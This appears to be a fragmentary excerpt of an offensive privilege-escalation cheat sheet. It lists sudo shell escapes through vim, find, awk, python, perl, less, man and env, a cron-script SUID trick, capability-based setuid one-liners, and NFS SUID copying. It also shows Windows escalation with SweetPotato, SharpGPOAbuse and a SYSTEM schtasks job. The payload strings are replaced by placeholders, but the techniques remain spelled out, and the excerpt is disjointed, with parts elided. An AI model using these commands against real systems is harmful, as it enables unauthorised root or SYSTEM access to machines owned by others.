...
sudo vim -c ':![REDACTED_SYSTEM_EXECUTION_PAYLOAD]'
sudo find /etc/passwd -exec [REDACTED_SYSTEM_EXECUTION_PAYLOAD] \;
sudo awk 'BEGIN {system("[REDACTED_SYSTEM_EXECUTION_PAYLOAD]")}'
sudo python -c 'import pty;pty.spawn("[REDACTED_SYSTEM_EXECUTION_PAYLOAD]")'
sudo perl -e 'exec "[REDACTED_SYSTEM_EXECUTION_PAYLOAD]";'
sudo less /etc/hosts    # then type: ![REDACTED_SYSTEM_EXECUTION_PAYLOAD]
sudo man man            # then type: ![REDACTED_SYSTEM_EXECUTION_PAYLOAD]
sudo env [REDACTED_SYSTEM_EXECUTION_PAYLOAD]
```
...
echo 'chmod +s [REDACTED_SYSTEM_EXECUTION_PAYLOAD]' > /home/user/systemupdate.sh
chmod +x /home/user/systemupdate.sh

# Wait for execution, then:
[REDACTED_SYSTEM_EXECUTION_PAYLOAD] -p
```
...
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("[REDACTED_SYSTEM_EXECUTION_PAYLOAD]")'

# Perl with cap_setuid
/usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "[REDACTED_SYSTEM_EXECUTION_PAYLOAD]";'
...
cd /tmp/mount
cp [REDACTED_SYSTEM_EXECUTION_PAYLOAD] .
chmod +s [REDACTED_SYSTEM_EXECUTION_PAYLOAD]
```
...
execute-assembly sweetpotato.exe -p [REDACTED_PAYLOAD].exe
...
.\SharpGPOAbuse.exe --AddComputerTask --Taskname "Update" `
  ...
  --Arguments "/c [REDACTED_SYSTEM_EXECUTION_PAYLOAD]" `
...
schtasks /create /S DOMAIN /SC Weekly /RU "NT Authority\SYSTEM" `
  /TN "enterprise" /TR "powershell.exe -c '[REDACTED_PAYLOAD]'"
